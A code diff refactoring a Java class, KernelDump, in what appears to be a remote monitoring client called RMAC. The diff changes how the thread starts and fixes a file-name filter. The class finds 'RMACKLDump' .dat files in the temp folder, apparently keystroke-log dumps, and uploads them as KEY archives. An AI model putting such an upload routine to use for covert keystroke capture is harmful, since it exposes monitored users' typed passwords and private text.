@@ -12,28 +12,35 @@ import java.util.stream.Stream;
 import lombok.extern.slf4j.Slf4j;
 
 @Slf4j
-public class KernelDump implements Runnable {
+public class KernelDump {
 
   public Thread thread;
 
   public KernelDump() {
-    thread = new Thread(this, "KernelDump");
-    thread.start();
+    this.thread = new Thread(this::run, "KernelDump");
   }
 
-  @Override
+  public void start() {
+    this.thread.start();
+  }
+
   public void run() {
-    List<Path> dumps = getAllLogFiles(Constants.SYS_TEMP_LOCATION);
+    List<Path> dumps = this.getAllLogFiles(Constants.SYS_TEMP_LOCATION);
     dumps.forEach(
         dump -> RMAC.uploader.uploadFile(dump.toAbsolutePath().toString(), ArchiveFileType.KEY));
   }
 
-  private List<Path> getAllLogFiles(String dirPath) {
+  public List<Path> getAllLogFiles(String dirPath) {
     List<Path> dumps = new ArrayList<>();
 
     try {
-      Path[] logFiles = RMAC.fs.list(dirPath).filter(path -> path.getFileName().endsWith(".dat")
-          && path.getFileName().startsWith("RMACKLDump")).toArray(Path[]::new);
+      Path[] logFiles = RMAC.fs
+          .list(dirPath)
+          .filter(path ->
+              path.getFileName().toString().endsWith(".dat") &&
+                  path.getFileName().toString().startsWith("RMACKLDump")
+          )
+          .toArray(Path[]::new);
 
       long newestModified = Long.MIN_VALUE;
       Path newestFile = null;
